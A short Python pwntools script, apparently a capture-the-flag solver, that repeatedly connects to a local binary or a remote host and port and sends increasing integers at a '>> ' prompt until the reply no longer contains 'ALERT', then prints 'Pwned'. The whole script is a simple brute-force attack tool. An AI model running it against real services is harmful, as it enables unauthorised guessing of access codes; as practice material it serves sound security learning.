#!/usr/bin/python3
# Requires: pip install pwntools

from pwn import *
import sys

#context.log_level = 'debug'

i = 0
while 1:
    if len(sys.argv) == 3:
        io = remote(sys.argv[1], sys.argv[2])
    elif len(sys.argv) == 2:
        io = process(sys.argv[1])
    else:
        print('Provide the executable or host + port.')
        print('# ./BruteForce.py FILE')
        print('# ./BruteForce.py IP PORT')
        exit()

    #io.recvuntil(b">> ")
    #io.sendline(str(i).encode('ascii'))
    io.sendlineafter(b">> ", str(i).encode('ascii'))

    i += 1

    data = str(io.recvline().strip().decode())
    if data.find("ALERT") != -1:
        print(str(data))
        io.close()
    else:
        print(data)
        print(io.recv().strip().decode())
        io.close()
        print('Pwned after', str(i), 'iterations.')
        exit()

    #io.interactive()

exit()
